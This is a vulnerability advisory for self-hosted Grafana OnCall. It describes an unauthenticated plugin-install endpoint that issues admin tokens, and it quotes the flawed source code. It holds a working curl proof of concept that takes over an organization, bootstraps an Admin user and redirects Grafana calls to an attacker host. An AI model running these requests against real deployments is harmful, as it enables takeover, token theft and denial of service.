https://github.com/grafana/oncall - "This repository was archived by the owner on Jun 5, 2026. It is now read-only." 

## Finding: Unauthenticated POST /api/internal/v1/plugin/v2/install/ issues a valid plugin admin token, enabling full takeover of the OnCall organization (OSS deployments)

Package: grafana-oncall (engine)

Affected Versions: all OSS releases up to and including the archived HEAD af0fbd40558c9a63bcf438589894c440fc434a54 (2026-03-24, the final commit on the dev branch); confirmed on the official grafana/oncall:latest Docker image

CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

CWE: CWE-306 — Missing Authentication for Critical Function

### Summary
The /api/internal/v1/plugin/v2/install/ endpoint (InstallV2View) is exposed without any authentication, and in self-hosted OSS deployments it identifies the local organization by two well-known default values that are hardcoded in the public source tree (stack_id=5, org_id=100). Any unauthenticated attacker who can reach the engine HTTP port can POST a small JSON document to this URL, receive a freshly minted PluginAuthToken bound to the only organization on the instance, and from that moment on call every PluginAuthentication-protected internal API as the equivalent of a Grafana Admin. Effects observed live include revoking the legitimate plugin token (denial of service for the real Grafana plugin), overwriting the organization's grafana_url and api_token via apply_sync_data, creating arbitrary admin users via the X-Oncall-User-Context bootstrap path on subsequent requests, issuing long-lived public API tokens, and creating integrations and webhooks. This is full unauthenticated takeover of the OnCall application.

### Details
File: engine/apps/grafana_plugin/views/install_v2.py

```
class InstallV2View(SyncV2View):
    authentication_classes = ()
    permission_classes = ()

    def post(self, request: Request) -> Response:
        if settings.LICENSE != settings.OPEN_SOURCE_LICENSE_NAME:
            return Response(data=asdict(SELF_HOSTED_ONLY_FEATURE_ERROR), status=status.HTTP_403_FORBIDDEN)

        try:
            organization = self.do_sync(request)
        except SyncException as e:
            return Response(
                data=asdict(e.error_data) if is_dataclass(e.error_data) else e.error_data,
                status=status.HTTP_400_BAD_REQUEST,
            )

        organization.revoke_plugin()
        provisioned_data = organization.provision_plugin()

        return Response(data=provisioned_data, status=status.HTTP_200_OK)
```

The view explicitly removes both authentication and permission checks (lines 16-17). The only gating logic is "license must be OpenSource", which is the default value for any self-hosted instance.

File: engine/apps/grafana_plugin/views/sync_v2.py (the inherited do_sync)

```
if settings.LICENSE == settings.OPEN_SOURCE_LICENSE_NAME:
    stack_id = settings.SELF_HOSTED_SETTINGS["STACK_ID"]
    org_id = settings.SELF_HOSTED_SETTINGS["ORG_ID"]
...
if sync_data.settings.org_id != org_id or sync_data.settings.stack_id != stack_id:
    raise SyncException(INVALID_SELF_HOSTED_ID)

organization = get_or_create_organization(sync_data.settings.org_id, sync_data.settings.stack_id, sync_data)
apply_sync_data(organization, sync_data)
return organization
```

In OSS mode the server compares the attacker-supplied stack_id and org_id against the local settings.SELF_HOSTED_SETTINGS values. Those values are not secrets; they are defined as compile-time defaults in the public source:

File: engine/settings/base.py, lines 849-858

```
SELF_HOSTED_SETTINGS = {
    "STACK_ID": getenv_integer("SELF_HOSTED_STACK_ID", 5),
    "STACK_SLUG": os.environ.get("SELF_HOSTED_STACK_SLUG", "self_hosted_stack"),
    "ORG_ID": 100,                       # hardcoded, no env override
    ...
}
```

ORG_ID has no environment-variable override at all and is always 100. STACK_ID defaults to 5 unless SELF_HOSTED_STACK_ID is set, which is not documented anywhere in the OSS install guide and is left at the default by every reproducible install we tested. As a result, the "validation" against stack_id/org_id is satisfied by any attacker who has read the open-source repository.

Once do_sync returns the (only) organization in the database, the view calls organization.revoke_plugin() and organization.provision_plugin(), which delete every existing PluginAuthToken for that organization and create a brand-new one. The plaintext token is returned to the caller in the response body:

File: engine/apps/user_management/models/organization.py, lines 272-286

```
def provision_plugin(self) -> ProvisionedPlugin:
    from apps.auth_token.models import PluginAuthToken
    _, token = PluginAuthToken.create_auth_token(organization=self)
    return {
        "stackId": self.stack_id,
        "orgId": self.org_id,
        "onCallToken": token,
        "license": settings.LICENSE,
    }

def revoke_plugin(self):
    from apps.auth_token.models import PluginAuthToken
    PluginAuthToken.objects.filter(organization=self).delete()
```

The returned token is a fully valid PluginAuthToken and is accepted by BasePluginAuthentication/PluginAuthentication on every endpoint that gates on those classes (the entire /api/internal/v1/* surface). Because PluginAuthentication is allowed to bootstrap a never-before-seen user when the caller supplies an X-Oncall-User-Context header (engine/apps/auth_token/auth.py, lines 178-200), the same token also lets the attacker create users with any role they like, including Admin:

File: engine/apps/auth_token/auth.py, lines 178-200

```
try:
    user_data = dict(json.loads(request.headers.get("X-Oncall-User-Context")))
except (ValueError, TypeError):
    raise exceptions.AuthenticationFailed("User context must be JSON dict.")
if user_data:
    ...
    user_sync_data = SyncUser(
        id=user_data["id"],
        ...
        role=user_data["role"],
        ...
    )
    return get_or_create_user(organization, user_sync_data)
```

The single unauthenticated POST therefore yields:

1. A plaintext plugin token that authenticates as the organization to every internal API view.
2. The legitimate Grafana plugin's token is revoked as a side effect (denial of service for the plugin).
3. The organization's grafana_url and api_token are overwritten with attacker-controlled values via apply_sync_data -> _sync_organization_data.
4. Arbitrary Admin users can be bootstrapped on subsequent calls, who can then create public API tokens that persist after any future re-install.

The same primitive also lets an unauthenticated attacker repeatedly rotate the plugin token, permanently locking out the legitimate Grafana plugin.

There is no rate limiting on the endpoint, no IP allowlist, no CSRF check, and no nonce. The view is enabled regardless of whether the instance has ever been "installed", and it works on a freshly migrated database (in which case the organization is created on-the-fly by get_or_create_organization -> _create_oss_organization).

### PoC

The PoC is the official docker-compose stack with no modifications to environment variables. Listening on port 9158 in this transcript (mapped to the container's 8080):

```
# 1) Obtain a valid plugin token, completely unauthenticated:

$ curl -sS http://localhost:9158/api/internal/v1/plugin/v2/install/ -X POST \
    -H "Content-Type: application/json" \
    -d '{
      "users": [],
      "teams": [],
      "team_members": {},
      "settings": {
        "stack_id": 5,
        "org_id": 100,
        "license": "OpenSource",
        "oncall_api_url": "http://localhost:9158",
        "oncall_token": "",
        "grafana_url": "http://attacker.example.com",
        "grafana_token": "fakeToken",
        "rbac_enabled": false,
        "incident_enabled": false,
        "incident_backend_url": "",
        "labels_enabled": false
      }
    }'

{"stackId":5,"orgId":100,"onCallToken":"b0a62c1eeb7f44559c6823252eaca9e534f7effe932e467dfee683e25b02ed12a613feb3fda9eb3ccefe5883b7d19654af4e7706fb591724f7dccf2a446da8e5","license":"OpenSource"}

# 2) Use the token (with header-based user bootstrap) to read the organization:

$ TOKEN=b0a62c1e...da8e5
$ curl -sS http://localhost:9158/api/internal/v1/organization/ \
    -H "Authorization: $TOKEN" \
    -H 'X-Instance-Context: {"stack_id":5,"org_id":100}' \
    -H 'X-Grafana-Context: {"UserId":9999}' \
    -H 'X-Oncall-User-Context: {"id":9999,"name":"AttackerAdmin","login":"attackerAdmin","email":"a@evil.com","role":"Admin","avatar_url":"","permissions":[],"teams":[]}'

{"pk":"OFA3HXLQQJH7K","name":"Self-Hosted Organization", ... }

# 3) Issue a permanent public-API token bound to the bootstrapped attacker user:

$ curl -sS http://localhost:9158/api/internal/v1/tokens/ -X POST \
    -H "Authorization: $TOKEN" \
    -H 'X-Instance-Context: {"stack_id":5,"org_id":100}' \
    -H 'X-Grafana-Context: {"UserId":9999}' \
    -H 'X-Oncall-User-Context: {"id":9999,"name":"AttackerAdmin","login":"attackerAdmin","email":"a@evil.com","role":"Admin","avatar_url":"","permissions":[],"teams":[]}' \
    -H "Content-Type: application/json" \
    -d '{"name":"pwn-token"}'

{"id":1,"token":"dd3580e49347eb9747cb003768ef86089a26de89793eca684ae48cc7d906b0eb","name":"pwn-token","created_at":"..."}

# 4) Create an integration as the bootstrapped admin user:

$ curl -sS http://localhost:9158/api/internal/v1/alert_receive_channels/ -X POST \
    -H "Authorization: $TOKEN" \
    -H 'X-Instance-Context: {"stack_id":5,"org_id":100}' \
    -H 'X-Grafana-Context: {"UserId":9999}' \
    -H 'X-Oncall-User-Context: {"id":9999,...,"role":"Admin","permissions":[]}' \
    -H "Content-Type: application/json" \
    -d '{"integration":"webhook","verbal_name":"PwnChannel"}'

{"id":"CW218XBZC66LP","integration":"webhook","verbal_name":"PwnChannel",...}
```

The PoC was executed live against the official `grafana/oncall` image (digest pulled 2026-05-25) with the default docker-compose.yml and no environment overrides other than DOMAIN and SECRET_KEY.

### Impact

Unauthenticated, network-only attacker -> full administrative compromise of the OnCall organization on any self-hosted OSS deployment whose engine port is reachable. Concretely:

- Read and modify every on-call schedule, escalation chain, integration, alert group, webhook, user, team, public API token, Slack/Telegram/MS Teams binding, and live setting.
- Mint persistent public API tokens that survive any future plugin re-install.
- Permanently lock the legitimate Grafana plugin out of the engine by revoking its PluginAuthToken on every call (DoS).
- Pivot to Grafana itself: by overwriting `organization.grafana_url` and `api_token` via apply_sync_data the attacker can also redirect subsequent OnCall->Grafana API calls to an attacker-controlled host.

Any self-hosted OSS deployment that exposes the engine port to a network beyond a fully trusted segment is affected. This includes installations behind a reverse proxy that forwards /api/internal/v1/* unchanged, which is the configuration produced by the official docker-compose.yml, the helm chart, and the documented "hobby" install. The project was archived on 2026-03-24 with no plans for a patch, so all current OSS deployments will remain vulnerable. Operators should restrict access to the engine HTTP port to the Grafana plugin host only (firewall or network policy), or front the engine with an authenticating proxy that blocks /api/internal/v1/plugin/v2/install/ unless the request originates from the legitimate Grafana plugin.
